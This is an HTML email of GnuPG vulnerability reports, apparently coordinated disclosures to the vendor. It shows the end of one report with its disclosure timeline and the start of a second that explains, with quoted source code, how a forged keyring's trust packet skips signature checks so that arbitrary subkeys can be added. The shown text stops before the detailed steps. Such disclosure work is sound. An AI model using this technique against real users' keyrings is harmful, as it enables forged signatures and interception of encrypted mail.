<span class=3D"line"><span style=3D"color:#FF7B72">          &#x26;&#x26;</=
span><span style=3D"color:#E6EDF3"> sig->keyid[</span><span style=3D"color:=
#79C0FF">1</span><span style=3D"color:#E6EDF3">] </span><span style=3D"colo=
r:#FF7B72">=3D=3D</span><span style=3D"color:#E6EDF3"> subk->keyid[</span><=
span style=3D"color:#79C0FF">1</span><span style=3D"color:#E6EDF3">]) &#123=
;</span></span>
<span class=3D"line"><span style=3D"color:#8B949E">          /* Issued by a=
 subkey.  */</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">          signer </span>=
<span style=3D"color:#FF7B72">=3D</span><span style=3D"color:#E6EDF3"> subk=
;</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">          break</span><s=
pan style=3D"color:#E6EDF3">;</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">        &#125;</span></s=
pan>
<span class=3D"line"><span style=3D"color:#E6EDF3">      &#125;</span></spa=
n>
<span class=3D"line"></span>
<span class=3D"line"><span style=3D"color:#FF7B72">      if</span><span sty=
le=3D"color:#E6EDF3"> (</span><span style=3D"color:#FF7B72">!</span><span s=
tyle=3D"color:#E6EDF3">signer) &#123;</span></span>
<span class=3D"line"><span style=3D"color:#8B949E">        // ...</span></s=
pan>
<span class=3D"line"><span style=3D"color:#E6EDF3">      &#125;</span></spa=
n>
<span class=3D"line"><span style=3D"color:#E6EDF3">    &#125;</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">  &#125;</span></span>
<span class=3D"line"></span>
<span class=3D"line"><span style=3D"color:#8B949E">  // ...</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">  </span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">  if</span><span style=
=3D"color:#E6EDF3"> (</span><span style=3D"color:#D2A8FF">IS_UID_SIG</span>=
<span style=3D"color:#E6EDF3">(sig) </span><span style=3D"color:#FF7B72">||=
</span><span style=3D"color:#D2A8FF"> IS_UID_REV</span><span style=3D"color=
:#E6EDF3">(sig)) &#123;</span></span>
<span class=3D"line"><span style=3D"color:#D2A8FF">    log_assert</span><sp=
an style=3D"color:#E6EDF3">(packet->pkttype </span><span style=3D"color:#FF=
7B72">=3D=3D</span><span style=3D"color:#E6EDF3"> PKT_USER_ID);</span></spa=
n>
<span class=3D"line"><span style=3D"color:#FF7B72">    if</span><span style=
=3D"color:#E6EDF3"> (sig->digest_algo </span><span style=3D"color:#FF7B72">=
=3D=3D</span><span style=3D"color:#E6EDF3"> DIGEST_ALGO_SHA1 </span><span s=
tyle=3D"color:#FF7B72">&#x26;&#x26;</span><span style=3D"color:#FF7B72"> !*=
</span><span style=3D"color:#E6EDF3">is_selfsig</span><span style=3D"color:=
#8B949E"> // &#x3C;-- [3]</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">      &#x26;&#x26;</span=
><span style=3D"color:#FF7B72"> !</span><span style=3D"color:#E6EDF3">opt.f=
lags.allow_weak_key_signatures) &#123;</span></span>
<span class=3D"line"><span style=3D"color:#8B949E">      /* If the signatur=
e was created using SHA-1 we consider this</span></span>
<span class=3D"line"><span style=3D"color:#8B949E">       * signature inval=
id because it makes it possible to mount a</span></span>
<span class=3D"line"><span style=3D"color:#8B949E">       * chosen-prefix c=
ollision.  We don't do this for</span></span>
<span class=3D"line"><span style=3D"color:#8B949E">       * self-signatures=
, though.  */</span></span>
<span class=3D"line"><span style=3D"color:#D2A8FF">      print_sha1_keysig_=
rejected_note</span><span style=3D"color:#E6EDF3">();</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">      rc </span><span st=
yle=3D"color:#FF7B72">=3D</span><span style=3D"color:#D2A8FF"> gpg_error</s=
pan><span style=3D"color:#E6EDF3">(GPG_ERR_DIGEST_ALGO);</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">    &#125; </span><span =
style=3D"color:#FF7B72">else</span><span style=3D"color:#E6EDF3"> &#123;</s=
pan></span>
<span class=3D"line"><span style=3D"color:#D2A8FF">      hash_public_key</s=
pan><span style=3D"color:#E6EDF3">(md, pripk);</span></span>
<span class=3D"line"><span style=3D"color:#D2A8FF">      hash_uid_packet</s=
pan><span style=3D"color:#E6EDF3">(packet->pkt.user_id, md, sig);</span></s=
pan>
<span class=3D"line"><span style=3D"color:#E6EDF3">      rc </span><span st=
yle=3D"color:#FF7B72">=3D</span><span style=3D"color:#D2A8FF"> check_signat=
ure_end_simple</span><span style=3D"color:#E6EDF3">(signer, sig, md, </span=
><span style=3D"color:#79C0FF">NULL</span><span style=3D"color:#E6EDF3">, <=
/span><span style=3D"color:#79C0FF">0</span><span style=3D"color:#E6EDF3">)=
;</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">    &#125;</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">  &#125;</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">  </span></span>
<span class=3D"line"><span style=3D"color:#8B949E">  // ...</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">  </span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">  return</span><span sty=
le=3D"color:#E6EDF3"> rc;</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">&#125;</span></span></co=
de></pre><!----> <p>Since the issue is obvious from the code itself, we do =
not write a proof of concept for it.</p> <h2>Recommendations</h2> <ol><li>A=
lways initialize memory before reading from it.</li> <li>Avoid code paths w=
here variable initialization depends on complex control flow.</li> <li>Thor=
oughly test the program with <a href=3D"https://github.com/google/sanitizer=
s/wiki/memorysanitizer" rel=3D"nofollow">memory sanitizer</a> enabled</li> =
<li>Look through static analysis results that point out potential uses of u=
ninitialized memory</li></ol> <hr/> <p>Finder credits: 49016</p> <p>Disclos=
ure Timeline:</p> <ul><li>21.10.2025: Submission of initial version of this=
 report.</li></ul> <p>Upcoming Timeline:</p> <ul><li>24.10.2025: Submission=
 of a talk for 39th Chaos Communication Congress (39C3). No technical detai=
ls shared.</li> <li>21.12.2025: Disclosure of this report on <a href=3D"htt=
ps://seclists.org/fulldisclosure/" rel=3D"nofollow">https://seclists.org/fu=
lldisclosure/</a></li> <li>26-31.12.2025: If accepted by content team, 39C3=
 Congress talk regarding this report</li></ul> <p>Please note: While we mig=
ht be able to offer some flexibility, our plan is to adhere to the above st=
ated upcoming timeline, regardless of the availability of patches or fixes.=
</p> <p>We kindly request allocation of a CVE number to track this issue. P=
lease keep us updated regarding your remediation efforts.</p> <p>Thank you<=
/p> <p>Best,
Liam</p><!----></article><!----><!----></main> <footer class=3D"bg-blue-500=
 p-4">contact: <a href=3D"/cdn-cgi/l/email-protection" class=3D"__cf_email_=
_" data-cfemail=3D"ef8c80819b8e8c9baf889f88c1898e8683">[email&#160;protecte=
d]</a></footer><!----><!--]--> <!--[!--><!--]--><!--]--><script data-cfasyn=
c=3D"false" src=3D"/cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode=
.min.js"></script></body>
</html>

--1yeeQ81UyVL57Vl7
Content-Type: text/html; charset=utf-8
Content-Disposition: attachment; filename="13-trust.html"
Content-Transfer-Encoding: quoted-printable

<!doctype html>
<html lang=3D"en">
	<head>
		<meta charset=3D"utf-8" />
		<meta name=3D"darkreader-lock" />
		<meta name=3D"viewport" content=3D"width=3Ddevice-width, initial-scale=3D=
1" />
		<link rel=3D"manifest" href=3D"/manifest.webmanifest">
        <link rel=3D"icon" href=3D"/favicon.ico" sizes=3D"32x32">
        <link rel=3D"icon" href=3D"/icon.svg" type=3D"image/svg+xml">
        <link rel=3D"apple-touch-icon" href=3D"/apple-touch-icon.png">
=09=09
		<link href=3D"./_app/immutable/assets/0.B3PCwX-h.css" rel=3D"stylesheet">=
<!--12qhfyh--><!----><title>gpg.fail</title>
	</head>
	<body><!--[--><!--[--><!----><main class=3D"min-w-full max-w-[1280px] my-a=
uto bg-green-500 p-4 space-y-4"><!----><article class=3D"prose mx-auto"><h1=
>GnuPG Trust Packet Parsing Enables Adding Arbitrary Subkeys</h1> <!----><p=
>An attacker can provide a forged keyring (via the <code>--keyring</code> p=
arameter in <em>GnuPG</em>). Successful exploitation allows for injection o=
f unauthorized, malicious encryption subkeys without necessitating the priv=
ate component of the master key.</p> <h2>Impact</h2> <p>Generally, the atta=
ck allows adding arbitrary subkeys to any key, for encryption or signing pu=
rposes, without necessitating authorization of the subkeys through a master=
 key signature. This includes subkey addition to already trusted main keys =
from other keyrings.</p> <h2>Details</h2> <p><em>GnuPG</em> supports <a hre=
f=3D"https://www.rfc-editor.org/rfc/rfc9580.html#name-trust-packet-type-id-=
12" rel=3D"nofollow">PGP trust packets</a>. The PGP RFC fails to provide a =
comprehensive and precise specification of the packet format:</p> <blockquo=
te><p>The Trust packet is used only within keyrings and is not normally exp=
orted. Trust packets contain data that record the user=E2=80=99s specificat=
ions of which keyholders are trustworthy introducers, along with other info=
rmation that implementation uses for trust information. <strong>The format =
of Trust packets is defined by a given implementation.</strong></p></blockq=
uote> <p>Among other purposes, <em>GnuPG</em> employs PGP trust packets for=
 caching the outcome of signature validation of <a href=3D"https://www.rfc-=
editor.org/rfc/rfc9580.html#name-subkey-binding-signature-ty" rel=3D"nofoll=
ow">PGP subkeys</a>.</p> <p>Through forging a malicious keyring, an attacke=
r can instruct <em>GnuPG</em> via the trust packet=E2=80=99s <code>flags.ch=
ecked [1]</code> and <code>flags.verified [2]</code> bits to skip the signa=
ture validation of the preceding signature packet.</p> <!----><pre class=3D=
"shiki github-dark-default" style=3D"background-color:#0d1117;color:#e6edf3=
" tabindex=3D"0"><code><span class=3D"line"><span style=3D"color:#8B949E">/=
* Parse a ring trust packet RFC4880 (5.10).</span></span>
<span class=3D"line"><span style=3D"color:#8B949E"> *</span></span>
<span class=3D"line"><span style=3D"color:#8B949E"> * This parser is specia=
l in that the packet is not stored as a packet</span></span>
<span class=3D"line"><span style=3D"color:#8B949E"> * but its content is me=
rged into the previous packet.  */</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">static</span><span style=
=3D"color:#79C0FF"> gpg_error_t</span><span style=3D"color:#D2A8FF"> parse_=
ring_trust</span><span style=3D"color:#E6EDF3">(</span><span style=3D"color=
:#79C0FF">parse_packet_ctx_t</span><span style=3D"color:#FFA657"> ctx</span=
><span style=3D"color:#E6EDF3">, </span><span style=3D"color:#FF7B72">unsig=
ned</span><span style=3D"color:#FF7B72"> long</span><span style=3D"color:#F=
FA657"> pktlen</span><span style=3D"color:#E6EDF3">) &#123;</span></span>
<span class=3D"line"><span style=3D"color:#8B949E">  // ...</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">  c </span><span style=
=3D"color:#FF7B72">=3D</span><span style=3D"color:#D2A8FF"> iobuf_get_noeof=
</span><span style=3D"color:#E6EDF3">(inp);</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">  rt.trustval </span><sp=
an style=3D"color:#FF7B72">=3D</span><span style=3D"color:#E6EDF3"> c;</spa=
n></span>
<span class=3D"line"><span style=3D"color:#FF7B72">  if</span><span style=
=3D"color:#E6EDF3"> (</span><span style=3D"color:#FF7B72">!</span><span sty=
le=3D"color:#E6EDF3">c) &#123;</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">    c </span><span style=
=3D"color:#FF7B72">=3D</span><span style=3D"color:#D2A8FF"> iobuf_get_noeof=
</span><span style=3D"color:#E6EDF3">(inp);</span></span>
<span class=3D"line"><span style=3D"color:#8B949E">    /* We require that b=
it 7 of the sigcache is 0 (easier</span></span>
<span class=3D"line"><span style=3D"color:#8B949E">     * eof handling).  *=
/</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">    if</span><span style=
=3D"color:#E6EDF3"> (</span><span style=3D"color:#FF7B72">!</span><span sty=
le=3D"color:#E6EDF3">(c </span><span style=3D"color:#FF7B72">&#x26;</span><=
span style=3D"color:#FF7B72"> 0x</span><span style=3D"color:#79C0FF">80</sp=
an><span style=3D"color:#E6EDF3">)) rt.sigcache </span><span style=3D"color=
:#FF7B72">=3D</span><span style=3D"color:#E6EDF3"> c;</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">  &#125; </span><span st=
yle=3D"color:#FF7B72">else</span><span style=3D"color:#E6EDF3"> &#123;</spa=
n><span style=3D"color:#8B949E"> /* ... */</span><span style=3D"color:#E6ED=
F3"> &#125;;</span></span>
<span class=3D"line"><span style=3D"color:#8B949E">  // ...</span></span>
<span class=3D"line"><span style=3D"color:#8B949E">  /* Now transfer the da=
ta to the respective packet.  Do not do this</span></span>
<span class=3D"line"><span style=3D"color:#8B949E">   * if SKIP_META is set=
.  */</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">  if</span><span style=
=3D"color:#E6EDF3"> (</span><span style=3D"color:#FF7B72">!</span><span sty=
le=3D"color:#E6EDF3">ctx->last_pkt.pkt.generic </span><span style=3D"color:=
#FF7B72">||</span><span style=3D"color:#E6EDF3"> ctx->skip_meta);</span></s=
pan>
<span class=3D"line"><span style=3D"color:#FF7B72">  else</span><span style=
=3D"color:#FF7B72"> if</span><span style=3D"color:#E6EDF3"> (rt.subtype </s=
pan><span style=3D"color:#FF7B72">=3D=3D</span><span style=3D"color:#E6EDF3=
"> RING_TRUST_SIG</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">    &#x26;&#x26;</span><=
span style=3D"color:#E6EDF3"> ctx->last_pkt.pkttype </span><span style=3D"c=
olor:#FF7B72">=3D=3D</span><span style=3D"color:#E6EDF3"> PKT_SIGNATURE) &#=
123;</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">    PKT_signature</span>=
<span style=3D"color:#FF7B72">*</span><span style=3D"color:#E6EDF3"> sig </=
span><span style=3D"color:#FF7B72">=3D</span><span style=3D"color:#E6EDF3">=
 ctx->last_pkt.pkt.signature;</span></span>
<span class=3D"line"></span>
<span class=3D"line"><span style=3D"color:#FF7B72">    if</span><span style=
=3D"color:#E6EDF3"> ((rt.sigcache </span><span style=3D"color:#FF7B72">&#x2=
6;</span><span style=3D"color:#79C0FF"> 1</span><span style=3D"color:#E6EDF=
3">)) &#123;</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">      sig->flags.checked=
 </span><span style=3D"color:#FF7B72">=3D</span><span style=3D"color:#79C0F=
F"> 1</span><span style=3D"color:#E6EDF3">;</span><span style=3D"color:#8B9=
49E">                       // [1]</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">      sig->flags.valid <=
/span><span style=3D"color:#FF7B72">=3D</span><span style=3D"color:#FF7B72"=
> !!</span><span style=3D"color:#E6EDF3">(rt.sigcache </span><span style=3D=
"color:#FF7B72">&#x26;</span><span style=3D"color:#79C0FF"> 2</span><span s=
tyle=3D"color:#E6EDF3">);</span><span style=3D"color:#8B949E">       // [2]=
</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">    &#125;</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">  &#125; </span><span st=
yle=3D"color:#FF7B72">else</span><span style=3D"color:#E6EDF3"> &#123;</spa=
n><span style=3D"color:#8B949E"> /* ... */</span><span style=3D"color:#E6ED=
F3"> &#125;</span></span>
<span class=3D"line"><span style=3D"color:#8B949E">  // ...</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">&#125;</span></span>
<span class=3D"line"></span></code></pre><!----> <p>By crafting a packet th=
at sets <code>sigcache</code> to <code>1 | 2</code>, <em>GnuPG</em> sets th=
e <code>checked</code> and <code>valid</code> flags of the last signature p=
acket to <code>true</code>.</p> <p>These flags are used in various parts of=
 the <em>GnuPG</em> code, but most notably in <code>check_key_signature2 [3=
, 4]</code>:</p> <!----><pre class=3D"shiki github-dark-default" style=3D"b=
ackground-color:#0d1117;color:#e6edf3" tabindex=3D"0"><code><span class=3D"=
line"><span style=3D"color:#8B949E">/* Check that a signature over a key (e=
.g., a key revocation, key</span></span>
<span class=3D"line"><span style=3D"color:#8B949E"> * binding, user id cert=
ification, etc.) is valid.  If the function</span></span>
<span class=3D"line"><span style=3D"color:#8B949E"> * detects a self-signat=
ure, it uses the public key from the specified</span></span>
<span class=3D"line"><span style=3D"color:#8B949E"> * key block and does no=
t bother looking up the key specified in the</span></span>
<span class=3D"line"><span style=3D"color:#8B949E"> * signature packet.</sp=
an></span>
<span class=3D"line"><span style=3D"color:#8B949E"> *</span></span>
<span class=3D"line"><span style=3D"color:#8B949E"> * ROOT is a keyblock.</=
span></span>
<span class=3D"line"><span style=3D"color:#8B949E"> *</span></span>
<span class=3D"line"><span style=3D"color:#8B949E"> * NODE references a sig=
nature packet that appears in the keyblock</span></span>
<span class=3D"line"><span style=3D"color:#8B949E"> * that should be verifi=
ed.</span></span>
<span class=3D"line"><span style=3D"color:#8B949E"> *</span></span>
<span class=3D"line"><span style=3D"color:#8B949E"> * If CHECK_PK is set, t=
he specified key is sometimes preferred for</span></span>
<span class=3D"line"><span style=3D"color:#8B949E"> * verifying signatures.=
  See the implementation for details.</span></span>
<span class=3D"line"><span style=3D"color:#8B949E"> *</span></span>
<span class=3D"line"><span style=3D"color:#8B949E"> * If RET_PK is not NULL=
, the public key that successfully verified</span></span>
<span class=3D"line"><span style=3D"color:#8B949E"> * the signature is copi=
ed into *RET_PK.</span></span>
<span class=3D"line"><span style=3D"color:#8B949E"> *</span></span>
<span class=3D"line"><span style=3D"color:#8B949E"> * If IS_SELFSIG is not =
NULL, *IS_SELFSIG is set to 1 if NODE is a</span></span>
<span class=3D"line"><span style=3D"color:#8B949E"> * self-signature.</span=
></span>
<span class=3D"line"><span style=3D"color:#8B949E"> *</span></span>
<span class=3D"line"><span style=3D"color:#8B949E"> * If R_EXPIREDATE is no=
t NULL, *R_EXPIREDATE is set to the expiry</span></span>
<span class=3D"line"><span style=3D"color:#8B949E"> * date.</span></span>
<span class=3D"line"><span style=3D"color:#8B949E"> *</span></span>
<span class=3D"line"><span style=3D"color:#8B949E"> * If R_EXPIRED is not N=
ULL, *R_EXPIRED is set to 1 if PK has been</span></span>
<span class=3D"line"><span style=3D"color:#8B949E"> * expired (0 otherwise)=
.  Note: PK being revoked does not cause this</span></span>
<span class=3D"line"><span style=3D"color:#8B949E"> * function to fail.</sp=
an></span>
<span class=3D"line"><span style=3D"color:#8B949E"> *</span></span>
<span class=3D"line"><span style=3D"color:#8B949E"> *</span></span>
<span class=3D"line"><span style=3D"color:#8B949E"> * If OPT.NO_SIG_CACHE i=
s not set, this function will first check if</span></span>
<span class=3D"line"><span style=3D"color:#8B949E"> * the result of a previ=
ous verification is already cached in the</span></span>
<span class=3D"line"><span style=3D"color:#8B949E"> * signature packet's da=
ta structure.</span></span>
<span class=3D"line"><span style=3D"color:#8B949E"> *</span></span>
<span class=3D"line"><span style=3D"color:#8B949E"> * TODO: add r_revoked h=
ere as well.  It has the same problems as</span></span>
<span class=3D"line"><span style=3D"color:#8B949E"> * r_expiredate and r_ex=
pired and the cache [nw].  Which problems [wk]? */</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">int</span><span style=3D=
"color:#D2A8FF"> check_key_signature2</span><span style=3D"color:#E6EDF3">(=
</span><span style=3D"color:#79C0FF">ctrl_t</span><span style=3D"color:#FFA=
657"> ctrl</span><span style=3D"color:#E6EDF3">,</span></span>
<span class=3D"line"><span style=3D"color:#79C0FF">                        =
 kbnode_t</span><span style=3D"color:#FFA657"> root</span><span style=3D"co=
lor:#E6EDF3">, </span><span style=3D"color:#79C0FF">kbnode_t</span><span st=
yle=3D"color:#FFA657"> node</span><span style=3D"color:#E6EDF3">, PKT_publi=
c_key</span><span style=3D"color:#FF7B72">*</span><span style=3D"color:#FFA=
657"> check_pk</span><span style=3D"color:#E6EDF3">,</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">                        =
 PKT_public_key</span><span style=3D"color:#FF7B72">*</span><span style=3D"=
color:#FFA657"> ret_pk</span><span style=3D"color:#E6EDF3">, </span><span s=
tyle=3D"color:#FF7B72">int*</span><span style=3D"color:#FFA657"> is_selfsig=
</span><span style=3D"color:#E6EDF3">,</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">                        =
 u32</span><span style=3D"color:#FF7B72">*</span><span style=3D"color:#FFA6=
57"> r_expiredate</span><span style=3D"color:#E6EDF3">, </span><span style=
=3D"color:#FF7B72">int*</span><span style=3D"color:#FFA657"> r_expired</spa=
n><span style=3D"color:#E6EDF3">) &#123;</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">  PKT_public_key</span><=
span style=3D"color:#FF7B72">*</span><span style=3D"color:#E6EDF3"> pk;</sp=
an></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">  PKT_signature</span><s=
pan style=3D"color:#FF7B72">*</span><span style=3D"color:#E6EDF3"> sig;</sp=
an></span>
<span class=3D"line"><span style=3D"color:#FF7B72">  int</span><span style=
=3D"color:#E6EDF3"> algo;</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">  int</span><span style=
=3D"color:#E6EDF3"> rc;</span></span>
<span class=3D"line"></span>
<span class=3D"line"><span style=3D"color:#FF7B72">  if</span><span style=
=3D"color:#E6EDF3"> (is_selfsig) </span><span style=3D"color:#FF7B72">*</sp=
an><span style=3D"color:#E6EDF3">is_selfsig </span><span style=3D"color:#FF=
7B72">=3D</span><span style=3D"color:#79C0FF"> 0</span><span style=3D"color=
:#E6EDF3">;</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">  if</span><span style=
=3D"color:#E6EDF3"> (r_expiredate) </span><span style=3D"color:#FF7B72">*</=
span><span style=3D"color:#E6EDF3">r_expiredate </span><span style=3D"color=
:#FF7B72">=3D</span><span style=3D"color:#79C0FF"> 0</span><span style=3D"c=
olor:#E6EDF3">;</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">  if</span><span style=
=3D"color:#E6EDF3"> (r_expired) </span><span style=3D"color:#FF7B72">*</spa=
n><span style=3D"color:#E6EDF3">r_expired </span><span style=3D"color:#FF7B=
72">=3D</span><span style=3D"color:#79C0FF"> 0</span><span style=3D"color:#=
E6EDF3">;</span></span>
<span class=3D"line"><span style=3D"color:#D2A8FF">  log_assert</span><span=
 style=3D"color:#E6EDF3">(node->pkt->pkttype </span><span style=3D"color:#F=
F7B72">=3D=3D</span><span style=3D"color:#E6EDF3"> PKT_SIGNATURE);</span></=
span>
<span class=3D"line"><span style=3D"color:#D2A8FF">  log_assert</span><span=
 style=3D"color:#E6EDF3">(root->pkt->pkttype </span><span style=3D"color:#F=
F7B72">=3D=3D</span><span style=3D"color:#E6EDF3"> PKT_PUBLIC_KEY);</span><=
/span>
<span class=3D"line"></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">  pk </span><span style=
=3D"color:#FF7B72">=3D</span><span style=3D"color:#E6EDF3"> root->pkt->pkt.=
public_key;</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">  sig </span><span style=
=3D"color:#FF7B72">=3D</span><span style=3D"color:#E6EDF3"> node->pkt->pkt.=
signature;</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">  algo </span><span styl=
e=3D"color:#FF7B72">=3D</span><span style=3D"color:#E6EDF3"> sig->digest_al=
go;</span></span>
<span class=3D"line"></span>
<span class=3D"line"><span style=3D"color:#8B949E">  /* Check whether we ha=
ve cached the result of a previous signature</span></span>
<span class=3D"line"><span style=3D"color:#8B949E">   * check.  Note that w=
e may no longer have the pubkey or hash</span></span>
<span class=3D"line"><span style=3D"color:#8B949E">   * needed to verify a =
sig, but can still use the cached value.  A</span></span>
<span class=3D"line"><span style=3D"color:#8B949E">   * cache refresh detec=
ts and clears these cases. */</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">  if</span><span style=
=3D"color:#E6EDF3"> (</span><span style=3D"color:#FF7B72">!</span><span sty=
le=3D"color:#E6EDF3">opt.no_sig_cache) &#123;</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">    cache_stats.total</s=
pan><span style=3D"color:#FF7B72">++</span><span style=3D"color:#E6EDF3">;<=
/span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">    if</span><span style=
=3D"color:#E6EDF3"> (sig->flags.checked)</span><span style=3D"color:#8B949E=
"> /* Cached status available.  */ // [3]</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">    &#123;</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">      cache_stats.cached=
</span><span style=3D"color:#FF7B72">++</span><span style=3D"color:#E6EDF3"=
>;</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">      if</span><span sty=
le=3D"color:#E6EDF3"> (is_selfsig) &#123;</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">        u32 </span><span=
 style=3D"color:#FFA657">keyid</span><span style=3D"color:#E6EDF3">[</span>=
<span style=3D"color:#79C0FF">2</span><span style=3D"color:#E6EDF3">];</spa=
n></span>
<span class=3D"line"></span>
<span class=3D"line"><span style=3D"color:#D2A8FF">        keyid_from_pk</s=
pan><span style=3D"color:#E6EDF3">(pk, keyid);</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">        if</span><span s=
tyle=3D"color:#E6EDF3"> (</span><span style=3D"color:#FFA657">keyid</span><=
span style=3D"color:#E6EDF3">[</span><span style=3D"color:#79C0FF">0</span>=
<span style=3D"color:#E6EDF3">] </span><span style=3D"color:#FF7B72">=3D=3D=
</span><span style=3D"color:#E6EDF3"> sig->keyid[</span><span style=3D"colo=
r:#79C0FF">0</span><span style=3D"color:#E6EDF3">] </span><span style=3D"co=
lor:#FF7B72">&#x26;&#x26;</span><span style=3D"color:#FFA657"> keyid</span>=
<span style=3D"color:#E6EDF3">[</span><span style=3D"color:#79C0FF">1</span=
><span style=3D"color:#E6EDF3">] </span><span style=3D"color:#FF7B72">=3D=
=3D</span><span style=3D"color:#E6EDF3"> sig->keyid[</span><span style=3D"c=
olor:#79C0FF">1</span><span style=3D"color:#E6EDF3">]) </span><span style=
=3D"color:#FF7B72">*</span><span style=3D"color:#E6EDF3">is_selfsig </span>=
<span style=3D"color:#FF7B72">=3D</span><span style=3D"color:#79C0FF"> 1</s=
pan><span style=3D"color:#E6EDF3">;</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">      &#125;</span></spa=
n>
<span class=3D"line"><span style=3D"color:#8B949E">      /* BUG: This is wr=
ong for non-self-sigs... needs to be the</span></span>
<span class=3D"line"><span style=3D"color:#8B949E">       * actual pk.  */<=
/span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">      rc </span><span st=
yle=3D"color:#FF7B72">=3D</span><span style=3D"color:#D2A8FF"> check_signat=
ure_metadata_validity</span><span style=3D"color:#E6EDF3">(pk, sig, r_expir=
ed, </span><span style=3D"color:#79C0FF">NULL</span><span style=3D"color:#E=
6EDF3">);</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">      if</span><span sty=
le=3D"color:#E6EDF3"> (rc) </span><span style=3D"color:#FF7B72">return</spa=
n><span style=3D"color:#E6EDF3"> rc;</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">      if</span><span sty=
le=3D"color:#E6EDF3"> (sig->flags.valid) &#123;</span><span style=3D"color:=
#8B949E"> // [4]</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">        cache_stats.good=
sig</span><span style=3D"color:#FF7B72">++</span><span style=3D"color:#E6ED=
F3">;</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">        return</span><sp=
an style=3D"color:#79C0FF"> 0</span><span style=3D"color:#E6EDF3">;</span><=
/span>
<span class=3D"line"><span style=3D"color:#E6EDF3">      &#125;</span></spa=
n>
<span class=3D"line"><span style=3D"color:#E6EDF3">      cache_stats.badsig=
</span><span style=3D"color:#FF7B72">++</span><span style=3D"color:#E6EDF3"=
>;</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">      return</span><span=
 style=3D"color:#D2A8FF"> gpg_error</span><span style=3D"color:#E6EDF3">(GP=
G_ERR_BAD_SIGNATURE);</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">    &#125;</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">  &#125;</span></span>
<span class=3D"line"><span style=3D"color:#8B949E">  // ...</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">&#125;</span></span></co=
de></pre><!----> <p><em>GnuPG</em> allows usage of these trust packets eith=
er temporarily via the <code>--keyring</code> argument or via the <code>res=
tore</code> import option. The documentation fails to warn the user of the =
possibility of importing trust packets with these operations and the severe=
 security consequences of doing so:</p> <blockquote><p>=E2=80=94keyring fil=
e</p> <ul><li>Add file to the current list of keyrings. If file begins with=
 a tilde and a slash, these are replaced by the $HOME directory. If the fil=
ename does not contain a slash, it is assumed to be in the GnuPG home direc=
tory (=E2=80=9D~/.gnupg=E2=80=9D unless =E2=80=94homedir or $GNUPGHOME is u=
sed).</li> <li>Note  that this adds a keyring to the current list. If the i=
ntent is to use the specified keyring alone, use =E2=80=94keyring along wit=
h =E2=80=94no-default-keyring.</li> <li>If the option =E2=80=94no-keyring h=
as been used no keyrings will be used at all.</li> <li>Note that if the opt=
ion use-keyboxd is enabled in =E2=80=98common.conf=E2=80=99, no keyrings ar=
e used at all and keys are all maintained by the keyboxd process in its own=
 database.</li></ul></blockquote> <blockquote><p>restore/import-restore</p>=
 <ul><li>Import in key restore mode.  This imports all data which is usuall=
y skipped during import; including all GnuPG specific data.  All other cont=
radicting options are overridden.</li></ul></blockquote> <p>By adding a key=
 binding and convincing their victim to use or import the forged keyring, a=
n attacker can:</p> <ul><li>Add themselves (their own subkey) as a recipien=
t for encryption operations, undermining confidentiality.</li> <li>Forge si=
gnatures that appear as valid, undermining integrity and authenticity.</li>=
 <li>Authenticate as being the target, undermining authenticity.</li> <li>C=
ertify new subkeys.</li> <li>Adding UIDs.</li></ul> <h3>Detailed steps to r=
